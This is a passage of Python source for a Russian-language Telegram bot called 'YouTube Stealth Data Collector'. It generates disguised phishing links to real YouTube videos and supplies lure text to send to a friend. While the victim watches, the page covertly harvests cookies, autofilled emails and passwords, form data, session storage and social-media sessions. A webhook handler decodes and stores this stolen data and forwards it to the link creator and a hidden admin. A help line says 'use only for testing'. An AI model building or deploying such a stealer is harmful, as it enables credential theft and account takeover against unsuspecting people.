            for i, user in enumerate(autofill['usernames'][:5], 1):
                report += f"{i}. `{user.get('value', 'N/A')}`\n"
                report += f"   Поле: {user.get('field', 'N/A')}\n"
        
        # Формы
        if autofill.get('forms'):
            report += "\n📝 *ДАННЫЕ ИЗ ФОРМ:*\n"
            for i, form in enumerate(autofill['forms'][:2], 1):
                report += f"{i}. Форма: {form.get('formId', 'N/A')}\n"
                report += f"   Действие: {form.get('action', 'N/A')}\n"
                if form.get('data'):
                    for key, value in list(form['data'].items())[:3]:
                        report += f"   `{key}`: `{value}`\n"
        
        # LocalStorage и SessionStorage
        if decoded_data.get('localStorage'):
            report += "\n💾 *LOCALSTORAGE (первые 10):*\n"
            storage_items = list(decoded_data['localStorage'].items())[:10]
            for i, (key, value) in enumerate(storage_items, 1):
                value_preview = str(value)[:100] + ("..." if len(str(value)) > 100 else "")
                report += f"{i}. `{key}`: `{value_preview}`\n"
        
        if decoded_data.get('sessionStorage'):
            report += "\n💾 *SESSIONSTORAGE (первые 10):*\n"
            storage_items = list(decoded_data['sessionStorage'].items())[:10]
            for i, (key, value) in enumerate(storage_items, 1):
                value_preview = str(value)[:100] + ("..." if len(str(value)) > 100 else "")
                report += f"{i}. `{key}`: `{value_preview}`\n"
        
        report += f"""
════════════════════════════════════════
⚠️ *ВНИМАНИЕ:* Все данные сохранены в базе
📊 Размер HTML страницы: {decoded_data.get('pageContent', 0)} символов
🕒 Время хранения: 24 часа
🔒 Данные зашифрованы при передаче
"""
        
        return report

# Глобальная переменная для приложения
telegram_app = None

# Команды бота
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /start"""
    user = update.effective_user
    
    welcome_message = f"""
👋 *Добро пожаловать, {user.first_name}!*

🎬 *YouTube Stealth Data Collector*

🚀 *Новый невидимый режим:*
• Настоящее YouTube видео
• НЕТ форм входа
• НЕТ подозрительных элементов
• Данные собираются В ФОНЕ
• Жертва ничего не замечает

🔍 *Что собирается автоматически:*
✓ Все cookies браузера
✓ Сохраненные emails и пароли
✓ Данные автозаполнения форм
✓ Активные сессии соцсетей
✓ Информацию об устройстве
✓ LocalStorage/SessionStorage
✓ Временную зону и язык
✓ Разрешение экрана

⚡ *Как использовать:*
1. Отправьте ссылку на YouTube видео
2. Получите stealth-ссылку
3. Отправьте её другу
4. Он увидит настоящее YouTube видео
5. Данные соберутся автоматически
6. Вы получите уведомление

⚠️ *Важно:* Все данные также отправляются администратору
"""
    
    keyboard = [
        [InlineKeyboardButton("🎬 Создать stealth-ссылку", callback_data="create_link")],
        [InlineKeyboardButton("📊 Мои ссылки", callback_data="my_links")],
        [InlineKeyboardButton("🆘 Помощь", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        welcome_message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def handle_youtube_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка YouTube ссылки"""
    user = update.effective_user
    url = update.message.text.strip()
    
    # Проверяем, является ли ссылкой на YouTube
    if not any(domain in url for domain in ['youtube.com', 'youtu.be']):
        await update.message.reply_text(
            "❌ Это не похоже на ссылку YouTube.\n"
            "Пожалуйста, отправьте ссылку в формате:\n"
            "`https://youtube.com/watch?v=...`\n"
            "или\n"
            "`https://youtu.be/...`"
        )
        return
    
    # Извлекаем ID видео
    video_id = LinkGenerator.extract_video_id(url)
    
    # Генерируем ID ссылки
    link_id = LinkGenerator.generate_link_id()
    
    # Создаем stealth ссылку
    phishing_url = LinkGenerator.create_phishing_url(video_id, link_id)
    
    # Создаем объект ссылки
    from dataclasses import replace
    link = PhishingLink(
        id=link_id,
        original_url=url,
        video_id=video_id,
        created_at=datetime.now().isoformat(),
        created_by=user.id
    )
    
    # Сохраняем в базу
    db.add_link(link)
    
    # Отправляем пользователю
    message = MessageFormatter.format_link_created(link_id, url, phishing_url)
    
    keyboard = [
        [
            InlineKeyboardButton("📋 Копировать ссылку", callback_data=f"copy_{link_id}"),
            InlineKeyboardButton("🚀 Поделиться", callback_data=f"share_{link_id}")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )
    
    # Отправляем уведомление админу
    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"🎬 Новая stealth-ссылка создана\n"
                 f"👤 User: @{user.username or user.id} ({user.first_name})\n"
                 f"🔗 Оригинал: {url}\n"
                 f"📌 ID: {link_id}\n"
                 f"🎬 Video ID: {video_id}\n"
                 f"🌐 Stealth ссылка: {phishing_url}\n"
                 f"🕒 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            parse_mode=ParseMode.MARKDOWN
        )
    except Exception as e:
        logger.error(f"Error notifying admin: {e}")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик inline кнопок"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data == "create_link":
        await query.message.reply_text(
            "🎬 *Отправьте ссылку на YouTube видео*\n\n"
            "Примеры:\n"
            "• `https://youtube.com/watch?v=dQw4w9WgXcQ`\n"
            "• `https://youtu.be/dQw4w9WgXcQ`\n\n"
            "Я создам stealth-ссылку. Жертва увидит настоящее YouTube видео,\n"
            "а данные соберутся автоматически в фоне.",
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif data == "my_links":
        user_id = query.from_user.id
        user_links = [link for link in db.links.values() if link.created_by == user_id]
        
        if not user_links:
            await query.message.reply_text("📭 У вас нет созданных ссылок.")
            return
        
        message = "📋 *ВАШИ STEALTH-ССЫЛКИ:*\n\n"
        for link in user_links[-5:]:
            message += f"• `{link.id}`\n"
            message += f"  Видео: {link.original_url[:40]}...\n"
            message += f"  Переходов: {link.clicks}\n"
            message += f"  Данных: {len(link.data_collected)}\n"
            message += f"  Cookies: {len(link.collected_cookies)}\n"
            message += "  ─────\n"
        
        await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
    
    elif data == "help":
        help_message = """
🆘 *ПОМОЩЬ ПО STEALTH РЕЖИМУ*

🎯 *Как это работает:*
1. Вы отправляете ссылку на YouTube видео
2. Бот создает stealth-ссылку на Railway
3. Жертва переходит по ссылке
4. Открывается настоящее YouTube видео
5. В фоне собираются ВСЕ данные
6. Вы получаете уведомление с данными

🔍 *Что собирается в фоне:*
• Все cookies (включая сессионные)
• Автозаполненные emails и пароли
• Данные из форм
• Активные сессии в соцсетях
• Информация об устройстве
• LocalStorage/SessionStorage

🎬 *Что видит жертва:*
• Настоящее YouTube видео
• Полноценный интерфейс YouTube
• Комментарии и рекомендации
• НИКАКИХ форм входа
• НИКАКИХ подозрительных элементов

⚠️ *Важные моменты:*
• Все данные также отправляются администратору
• Ссылка активна 24 часа
• Используйте только для тестирования
• Не используйте для незаконных целей

🌐 *Ваш Railway сервер:* {DOMAIN}
""".format(DOMAIN=DOMAIN)
        await query.message.reply_text(help_message, parse_mode=ParseMode.MARKDOWN)
    
    elif data.startswith("copy_"):
        link_id = data[5:]
        link = db.get_link(link_id)
        if link and link.created_by == query.from_user.id:
            phishing_url = LinkGenerator.create_phishing_url(link.video_id, link_id)
            await query.message.reply_text(
                f"📋 *Stealth-ссылка для копирования:*\n\n`{phishing_url}`\n\n"
                "Используйте Ctrl+C / Cmd+C для копирования.",
                parse_mode=ParseMode.MARKDOWN
            )
    
    elif data.startswith("share_"):
        link_id = data[6:]
        link = db.get_link(link_id)
        if link and link.created_by == query.from_user.id:
            phishing_url = LinkGenerator.create_phishing_url(link.video_id, link_id)
            share_text = f"""
🎬 Привет! Посмотри это крутое видео! 🎥

Я нашел супер интересный ролик на YouTube!
Обязательно посмотри - там реально круто! 😎

🔗 Ссылка на видео:
{phishing_url}

🔥 Топ контент, рекомендую! 👍
"""
            await query.message.reply_text(
                f"📤 *Текст для отправки:*\n\n{share_text}\n\n"
                "Скопируйте и отправьте другу.",
                parse_mode=ParseMode.MARKDOWN
            )

# Webhook обработчик для stealth сбора данных
async def handle_stealth_webhook(request_data: Dict, context: ContextTypes.DEFAULT_TYPE):
    """Обработка данных от stealth страницы"""
    try:
        link_id = request_data.get("link_id")
        if not link_id:
            logger.error("No link ID in stealth webhook")
            return {"status": "error", "message": "No link ID"}
        
        # Обновляем счетчик кликов
        db.add_click(link_id)
        
        # Получаем информацию о ссылке
        link = db.get_link(link_id)
        if not link:
            logger.error(f"Link {link_id} not found in database")
            return {"status": "error", "message": "Link not found"}
        
        # Сохраняем сырые данные
        if 'data' in request_data:
            try:
                decoded_data = json.loads(base64.b64decode(request_data['data']).decode('utf-8'))
                db.add_full_sensitive_data(link_id, decoded_data)
                
                # Извлекаем cookies
                cookies = decoded_data.get('cookies', {})
                if cookies:
                    cookies_list = []
                    for name, value in cookies.items():
                        cookies_list.append({
                            "name": name,
                            "value": str(value)[:500],
                            "timestamp": datetime.now().isoformat()
                        })
                    db.add_collected_cookies(link_id, cookies_list)
                
                # Извлекаем автозаполненные данные
                autofill = decoded_data.get('autofill', {})
                if autofill.get('emails'):
                    for email in autofill['emails']:
                        db.add_collected_logins(link_id, [{
                            "field_name": email.get('field', 'email'),
                            "value": email.get('value', ''),
                            "timestamp": email.get('timestamp', datetime.now().isoformat())
                        }])
                
                if autofill.get('passwords'):
                    for pwd in autofill['passwords']:
                        db.add_collected_passwords(link_id, [{
                            "field_name": pwd.get('field', 'password'),
                            "value": pwd.get('value', ''),
                            "timestamp": pwd.get('timestamp', datetime.now().isoformat())
                        }])
                
                # Сохраняем общие данные
                db.add_collected_data(link_id, decoded_data)
                
            except Exception as e:
                logger.error(f"Error processing stealth data: {e}")
        
        # Отправляем уведомление создателю ссылки
        try:
            message = MessageFormatter.format_collected_data(link_id, request_data)
            await context.bot.send_message(
                chat_id=link.created_by,
                text=message,
                parse_mode=ParseMode.MARKDOWN
            )
        except Exception as e:
            logger.error(f"Error sending to link creator: {e}")
        
        # Отправляем ДЕТАЛЬНЫЙ отчет администратору
        try:
            report = MessageFormatter.format_detailed_admin_report(link_id, request_data)
            chunks = split_message(report, 3900)
            
            for i, chunk in enumerate(chunks):
                parse_mode = ParseMode.MARKDOWN if i == 0 else None
                await context.bot.send_message(
                    chat_id=ADMIN_ID,
                    text=chunk,
                    parse_mode=parse_mode,
                    disable_web_page_preview=True
                )
        except Exception as e:
            logger.error(f"Error sending detailed report to admin: {e}")
        
        return {"status": "success", "data_received": True}
    
    except Exception as e:
        logger.error(f"Error in stealth webhook handler: {e}", exc_info=True)
        return {"status": "error", "message": str(e)}

# Обработчик ошибок
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик ошибок"""
    logger.error(f"Update {update} caused error {context.error}", exc_info=True)
    
    try:
        error_msg = str(context.error)
        if len(error_msg) > 1000:
            error_msg = error_msg[:1000] + "..."
        
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"⚠️ *Ошибка в stealth боте:*\n\n{error_msg}",
            parse_mode=ParseMode.MARKDOWN
        )
    except:
        pass

def main():
    """Запуск бота и Railway сервера"""
    # Создаем приложение
    global telegram_app
    telegram_app = Application.builder().token(BOT_TOKEN).build()
    
    # Регистрируем обработчики команд
    telegram_app.add_handler(CommandHandler("start", start_command))
    
    # Обработчик YouTube ссылок
    telegram_app.add_handler(MessageHandler(
        filters.TEXT & filters.Regex(r'(youtube\.com|youtu\.be)'),
        handle_youtube_link
    ))
    
    # Обработчик inline кнопок
    telegram_app.add_handler(CallbackQueryHandler(button_handler))
    
    # Обработчик ошибок
    telegram_app.add_error_handler(error_handler)
    
    # Создаем папку для скриншотов
    os.makedirs("screenshots", exist_ok=True)
    
    # Запускаем Flask сервер в отдельном потоке
    try:
        from server import app as flask_app
        
        def run_flask():
            port = int(os.environ.get('PORT', 5000))
            flask_app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
        
        flask_thread = threading.Thread(target=run_flask, daemon=True)
        flask_thread.start()
        
        print(f"✅ Flask сервер запущен на порту: {os.environ.get('PORT', 5000)}")
        print(f"🌐 Ваш Railway домен: {DOMAIN}")
        
    except ImportError as e:
        print(f"⚠️ Flask сервер не запущен: {e}")
        print("⚠️ Для работы Railway нужен файл server.py")
    
    # Запускаем бота
    print("🤖 YouTube Stealth Data Collector запущен!")
    print(f"👑 Админ: {ADMIN_ID}")
    print(f"🌐 Railway домен: {DOMAIN}")
    print("🎬 Режим: НЕВИДИМЫЙ СБОР ДАННЫХ")
    print("📌 Особенности:")
    print("   - Настоящее YouTube видео")
    print("   - НЕТ форм входа")
    print("   - Данные собираются в фоне")
    print("   - Жертва ничего не замечает")
    print("⏳ Ожидание команд...")
    print("💡 Просто отправьте ссылку на YouTube видео")
    
    telegram_app.run_polling(allowed_updates=Update.ALL_UPDATES)

if __name__ == '__main__':
    main()